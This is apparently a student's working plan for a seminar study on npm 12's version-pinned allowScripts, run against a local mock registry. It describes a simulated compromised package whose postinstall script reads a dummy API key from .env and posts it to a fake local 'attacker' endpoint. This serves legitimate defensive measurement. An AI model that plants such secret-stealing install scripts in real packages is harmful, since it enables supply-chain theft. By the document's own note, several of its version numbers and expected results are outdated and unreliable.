# Defeating npm Supply-Chain Attacks: Version-Pinned allowScripts in Web Builds - plan

> Historical working plan: later implementation differs from several examples and expected results below. Use [REPORT.md](../REPORT.md), [README.md](../README.md), and the raw logs for the current study. The runner does not perform an actual upgrade or test three attack vectors; the re-approval check is implemented separately.

## Step 1: Check Your `npm` Version & Create the Repo Layout

Target npm version: **12.2.2**. Verify the install-script policy behavior before running the experiment.

First, make sure your team has **npm v12.0.0 or newer** (released July 2026), which is the first version that blocks unapproved install scripts by default and supports version-pinned `allowScripts`.

```sh
node -v
npm -v   # Should print 12.x.x (if lower, run: npm install -g npm@12)

```

Create a public GitHub repository with this folder structure so all required seminar deliverables live in one place:

```sh
csc13114-npm12-allowscripts/
├── README.md                    # Step-by-step instructions from fresh clone to npm run measure
├── package.json                 # Root scripts ("measure": "node scripts/measure.js")
├── scripts/
│   ├── setup-registry.js        # Packs local .tgz tarballs for offline, repeatable runs
│   └── measure.js               # Runs 5+ cold-cache tests for Baseline vs. Pinned & saves logs
├── mock-registry/
│   ├── server.js                # Local fake npm registry + fake "attacker" HTTP listener
│   └── tarballs/                # Local .tgz package files (no internet needed during tests)
├── sample-app/                  # 25-package Vite + React web app used for the benchmark
│   ├── .env                     # Contains DUMMY_API_KEY=SECRET_TOKEN_12345
│   ├── package.json
│   └── src/
├── results/                     # Raw JSON/log outputs from every run (committed to Git)
├── REPORT.md                    # Your 3-page study report
├── slides.pdf                   # Your presentation slides
├── TALK.md                      # Link to your <= 8 min video
├── AI-LOG.md                    # Log of AI tools used + mistakes you caught
└── SELF_ASSESSMENT_REPORT.md    # Your rubric self-score table

```

---

## Step 2: Build the 3 Local Test Pieces (100% on `localhost`)

Everything must run on your own machine without touching the real npm registry during tests.

### Piece A: The Fake "Attacker" Listener (`mock-registry/server.js`)

Write a small Node.js HTTP server on `http://127.0.0.1:4001` with two routes:

* `POST /steal`: Receives any stolen `.env` key sent by a test package, saves it to an in-memory array (`leakedSecrets.push(...)`), and responds `200 OK`.  
* `GET /status` & `POST /reset`: Lets your measurement script check how many secrets leaked during a run and reset the counter to `0` before the next run.

### Piece B: The Local Fake npm Registry (`mock-registry/server.js`)

In the same file, run a second HTTP server on `http://127.0.0.1:4002` that acts as a local npm registry serving `.tgz` files from `mock-registry/tarballs/`:

1. **`helper-pkg@1.0.0` (Clean version):** Has a harmless `"postinstall": "node -e \"console.log('helper 1.0.0 setup ok')\""`.  
2. **`helper-pkg@1.0.1` (Simulated compromised update):** Has a `"postinstall"` script that reads `DUMMY_API_KEY` from `.env` and sends it via `fetch("http://127.0.0.1:4001/steal", ...)`.  
3. **24 normal Vite \+ React packages:** Including `vite`, `react`, `react-dom`, plus legitimate tools that rely on install scripts (`esbuild`, `sharp`, `husky`).

>   
> **Pro tip for reproducibility:** Download/pack those 24 normal packages into `mock-registry/tarballs/` once using `npm pack` during setup. That way, when your red team clones your repo and runs `npm run measure`, it installs from local `.tgz` files on disk—making every run fast, offline-ready, and identical.

### Piece C: The 25-Package Sample Web App (`sample-app/`)

Create a standard Vite \+ React app (`npm create vite@latest sample-app -- --template react`) and add a `.env` file:

```
DUMMY_API_KEY=SECRET_TOKEN_12345
```

Set its dependencies to install the 24 packages plus `"helper-pkg": "^1.0.0"`. Because of the `^` caret, `npm install` will try to upgrade `helper-pkg` from `1.0.0` to `1.0.1` when `1.0.1` appears in your local registry.

---

## Step 3: Set Up the Only Variable That Changes (Baseline vs. Change)

**Current implementation:** Run `node scripts/set-policy.js baseline` or `node scripts/set-policy.js pinned` from the repository root. The policies approve `esbuild@0.28.2` in both cases and differ only in the `helper-pkg` approval. The examples below are the original plan; their package versions and package count are not the current workload. The current sharp and husky packages should not be assumed to have install scripts without checking their actual manifests.

To earn full marks on **Criterion 1 (15 points)**, hold everything fixed (same machine, same 25 packages, same cold cache) and change **only** how `allowScripts` is configured in `sample-app/package.json`:

1. **Baseline (`baseline` mode — unpinned allowlist):**  
     
* You previously approved `helper-pkg` using `npm approve-scripts --no-allow-scripts-pin helper-pkg` (along with `esbuild` and `sharp`).  
    
* Inside `package.json`, `allowScripts` looks like this:

```json
"allowScripts": {
  "helper-pkg": true,
  "esbuild@0.25.0": true,
  "sharp@0.34.0": true
}
```

* **What happens when `1.0.1` is released:** Because `"helper-pkg": true` has no version number, `npm` trusts *any* version of `helper-pkg`. It runs `helper-pkg@1.0.1`'s malicious `postinstall` script and leaks `SECRET_TOKEN_12345`.  
    
2. **Change (`pinned` mode — npm 12 default version-pinned allowlist):**  
     
* You previously approved `helper-pkg@1.0.0` using `npm approve-scripts helper-pkg` (npm 12's default behavior).  
    
* Inside `package.json`, `allowScripts` looks like this:

```json
"allowScripts": {
  "helper-pkg@1.0.0": true,
  "esbuild@0.25.0": true,
  "sharp@0.34.0": true
}
```

* **What happens when `1.0.1` is released:** `npm` sees that `1.0.0` was approved, **not** `1.0.1`. It blocks `helper-pkg@1.0.1`'s `postinstall` script, prints `npm warn install-scripts`, and leaks **0** secrets.

---

## Step 4: Automate the Measurement (`npm run measure`)

**Current implementation:** `npm run measure` starts isolated local services, makes temporary project copies with separate empty caches, alternates five runs per policy, and saves raw output and summaries under `results/`. It pins the test dependency to `1.0.1` in both copies and models prior approval through the policy; it does not perform a real upgrade or measure re-approvals. `blockedWarningLines` counts log lines, not blocked packages. The steps below are the original proposal and do not describe the implementation's temporary-directory approach.

Write `scripts/measure.js` so that running **`npm run measure`** from the root folder automatically performs **5 cold-cache runs** for Baseline and **5 cold-cache runs** for Pinned (`10` runs total).

For each individual run (`i = 1..5`), `measure.js` should do these exact 5 steps:

1. **Force a cold cache:** Delete `sample-app/node_modules`, delete `sample-app/package-lock.json`, and point npm to a brand-new empty cache folder (`--cache ./tmp-cache-run-${i}`). (This prevents the red team from flagging a "warm cache" bug.)  
     
2. **Reset the listener:** Call `POST http://127.0.0.1:4001/reset` so the leaked secret count starts at `0`.  
     
3. **Run & time the build:** Start `performance.now()`, execute `npm install --registry=http://127.0.0.1:4002 && npm run build` inside `sample-app/`, and stop the timer (`durationMs`).  
     
4. **Collect the 4 numbers:**  
     
   * `secretsLeaked`: `0` or `1` (from `GET http://127.0.0.1:4001/status`).  
   * `buildSucceeded`: `true` or `false` (checks that `sample-app/dist/index.html` was created).  
   * `blockedScriptWarnings`: Count of `npm warn install-scripts` lines in stdout/stderr (shows how many packages require manual `npm approve-scripts` review).  
   * `durationMs`: Total cold-cache install \+ build time in milliseconds.

   

5. **Save raw logs & print summary:** Write every run's raw output to `results/baseline-run-1.json` ... `results/pinned-run-5.json`, then print a summary table showing the **median** and **spread (min–max)** for both modes.

---

## Step 5: Measure the "Developer Friction" Cost (1 Extra Sub-Test)

**Current implementation:** The runner models a previous approval of `esbuild@0.28.1` and installs the available `esbuild@0.28.2` under name-only and old-version policies. It checks the build, runs `npm install-scripts approve esbuild` for the pinned case, and checks the build again. It does not install the previous version or perform an actual upgrade. The current `sharp@0.35.5` has no install lifecycle script, so it is not included in the re-approval count. Results are saved as `reapproval-baseline.json` and `reapproval-pinned.json`. The version examples and expected counts below are the original proposal.

To make your **Findings and recommendation (Criterion 3 — 20 points)** stand out, add a small second check inside `measure.js`:

* Simulate a **legitimate patch update** to `esbuild` (`0.25.0` → `0.25.1`) and `sharp` (`0.34.0` →  `0.34.1`).  
* Measure how many manual `npm approve-scripts` re-approvals a developer has to run under version-pinned mode (`2` re-approvals) compared to unpinned mode (`0` re-approvals), and check whether Vite's build fails when `esbuild`'s new binary setup script is blocked.  
* This gives you concrete evidence for **when NOT to use version pinning** (for example, in repositories with automated daily dependency-update bots like Dependabot/Renovate where every patch bump would pause CI until a human runs `npm approve-scripts`).

---

## Step 6: Your Pre-Submission Checklist

| Milestone / Rubric Check | What to Do |
| :---- | :---- |
| **Register by Sun, Nov 15 (22:00)** | Claim row **`OWN1`** in the class sheet with your student IDs, title (`Version-Pinned Install Script Allowlisting (npm 12 allowScripts) in Web Builds`), and tightened question. |
| **Verify all facts (Criterion 5\)** | Cite the official `npm install-scripts` docs (`[docs.npmjs.com/cli/v12/commands/npm-install-scripts/](https://docs.npmjs.com/cli/v12/commands/npm-install-scripts/)`) and the date you read them in `REPORT.md`. |
| **Keep `AI-LOG.md` real (Criterion 6\)** | Record which AI tool helped write `measure.js` / `server.js`, and include at least one real mistake you caught and fixed (such as an outdated flag name or a warm-cache script bug). |
| **Test a fresh clone before Nov 29** | Clone your own public GitHub repo into a separate folder on another teammate's laptop, follow only your `README.md`, and verify `npm run measure` reproduces numbers within your reported spread. |
